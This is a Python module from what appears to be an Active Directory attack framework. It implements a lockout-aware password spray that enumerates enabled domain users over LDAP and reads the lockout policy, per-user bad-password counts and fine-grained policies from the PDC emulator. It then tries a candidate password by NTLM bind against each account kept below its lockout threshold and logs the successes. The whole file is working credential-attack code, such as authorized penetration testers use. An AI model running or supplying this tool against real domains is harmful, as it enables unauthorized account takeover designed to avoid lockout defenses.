"""Lockout-aware password spray.

Enumerates lockoutThreshold / lockoutObservationWindow and per-user
badPwdCount / badPasswordTime to keep every account safely below the
threshold. Emits per-attempt and per-hit records.
"""

from __future__ import annotations

import json
import time
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from ldap3 import SUBTREE, Connection, Server
from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.lockout import (
    account_lockout_state,
    domain_has_pso,
    effective_lockout_threshold,
    filetime_to_dt,
    locate_pdc_emulator,
    read_domain_lockout_policy,
)
from adaf_attack.core.registry import (
    ApprovalPolicy,
    RiskLevel,
    RollbackClass,
    SafetyProfile,
    register_capability,
)
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


_filetime_to_dt = filetime_to_dt
_read_lockout_policy = read_domain_lockout_policy


def _load_users(source: str | None, conn: Any, base_dn: str, filter_expr: str | None) -> list[str]:
    path = Path(source).expanduser() if source else None
    if path and path.is_file():
        return [
            line.strip() for line in path.read_text(encoding="utf-8").splitlines() if line.strip()
        ]
    conn.search(
        base_dn,
        filter_expr
        or "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
        search_scope=SUBTREE,
        attributes=["sAMAccountName", "badPwdCount", "badPasswordTime"],
    )
    users: list[str] = []
    for entry in conn.entries:
        sam = str(entry.sAMAccountName) if entry.sAMAccountName else None
        if sam:
            users.append(sam)
    return users


def _account_lockout_state(conn: Any, base_dn: str, sam: str) -> tuple[int, datetime | None]:
    try:
        bad, ts, _pso = account_lockout_state(conn, base_dn, sam, require_pso=False)
    except RuntimeError:
        return 0, None
    return bad, ts


def _try_bind(target: Target, username: str, password: str, ldaps: bool) -> tuple[bool, str]:
    server = Server(target.dc_ip, use_ssl=ldaps, get_info=None)
    user_dn = f"{target.domain}\\{username}"
    try:
        conn = Connection(
            server, user=user_dn, password=password, authentication="NTLM", auto_bind=True
        )
        conn.unbind()
        return True, "ok"
    except Exception as exc:
        return False, str(exc)[:200]


@register_capability(
    id="password-spray",
    summary="Lockout-aware password spray against user accounts",
    category="credential-access",
    tags=("password-spray", "brute-force", "lockout"),
    safety=SafetyProfile(
        risk=RiskLevel.SIDE_EFFECT,
        approval=ApprovalPolicy.SCOPED_TOKEN,
        rollback=RollbackClass.NONE,
        network_side_effect=True,
        exposes_credentials=True,
    ),
)
class PasswordSpray:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        password = (
            kwargs.get("password_to_try") or kwargs.get("spray_password") or kwargs.get("value")
        )
        if not password:
            raise RuntimeError("Pass -P spray_password=<candidate> (or --value).")
        users_source = kwargs.get("users") or kwargs.get("userlist")
        user_filter = kwargs.get("user_filter")
        safety_margin = int(kwargs.get("safety_margin", 2))
        delay_seconds = float(kwargs.get("delay_seconds", 0.0))
        max_attempts = int(kwargs.get("max_attempts", 0))

        console.print(f"[bold]Password spray[/bold] → {target.domain} @ {target.dc_ip}")
        conn, base_dn, _ = ldap_connect(target)
        policy = _read_lockout_policy(conn, base_dn)
        users = _load_users(users_source, conn, base_dn, user_filter)
        if max_attempts and len(users) > max_attempts:
            users = users[:max_attempts]
        console.print(f"Users: {len(users)}")

        threshold = policy["lockout_threshold"]
        if threshold <= 0:
            conn.unbind()
            raise RuntimeError(
                "Password spray requires a verified non-zero lockoutThreshold; "
                "refusing to continue when lockout policy is unavailable or disabled."
            )
        pdc_host = locate_pdc_emulator(conn, base_dn)
        pso_present = domain_has_pso(conn, base_dn)
        console.print(
            f"Policy: threshold={policy['lockout_threshold']}  "
            f"window={policy['observation_window_seconds']}s  pdc={pdc_host}"
        )
        if pdc_host.lower() == str(target.dc_ip or "").lower():
            pdc_conn, pdc_base = conn, base_dn
        else:
            pdc_conn, pdc_base, _ = ldap_connect(
                Target(
                    domain=target.domain,
                    dc_ip=pdc_host,
                    username=target.username,
                    password=target.password,
                    hashes=target.hashes,
                    aes_key=target.aes_key,
                    ccache=target.ccache,
                    use_kerberos=target.use_kerberos,
                    ldaps=target.ldaps,
                    starttls=target.starttls,
                )
            )
        attempts: list[dict[str, Any]] = []
        hits: list[dict[str, Any]] = []

        for sam in users:
            bad, _last_ts, pso_threshold = account_lockout_state(
                pdc_conn, pdc_base, sam, require_pso=pso_present
            )
            effective = effective_lockout_threshold(threshold, pso_threshold)
            safe_ceiling = effective - safety_margin
            if effective <= 0 or bad >= safe_ceiling:
                attempts.append(
                    {
                        "sam": sam,
                        "skipped": "at_or_near_lockout",
                        "bad_pwd_count": bad,
                        "threshold": effective,
                    }
                )
                console.print(f"  [yellow]skip[/yellow] {sam} bad={bad}/{effective}")
                continue
            ok, note = _try_bind(target, sam, password, target.ldaps)
            record = {
                "sam": sam,
                "bad_pwd_count_pre": bad,
                "ok": ok,
                "note": note,
                "attempted_at": datetime.now(UTC).isoformat(),
            }
            attempts.append(record)
            if ok:
                hits.append({"sam": sam, "note": note})
                console.print(f"  [green]HIT[/green] {sam}")
                node = f"USER@{sam.upper()}@{target.domain.upper()}"
                graph.add_node(node, "User", sam=sam, spray_hit=True)
                graph.add_edge(node, node, "PasswordSprayHit")
            else:
                console.print(f"  [dim]miss[/dim] {sam}")
            if delay_seconds:
                time.sleep(delay_seconds)
        if pdc_conn is not conn:
            pdc_conn.unbind()
        conn.unbind()

        result = {
            "domain": target.domain,
            "pdc": pdc_host,
            "policy": policy,
            "attempts": attempts,
            "hits": hits,
            "hit_count": len(hits),
            "attempt_count": len(attempts),
        }
        out = session.path("spray.json")
        out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "password-spray.complete",
            attempts=len(attempts),
            hits=len(hits),
            threshold=threshold,
        )
        console.print(f"[green]Done[/green]  attempts={len(attempts)}  hits={len(hits)}")
        console.print(f"Results → {out}")
        return result
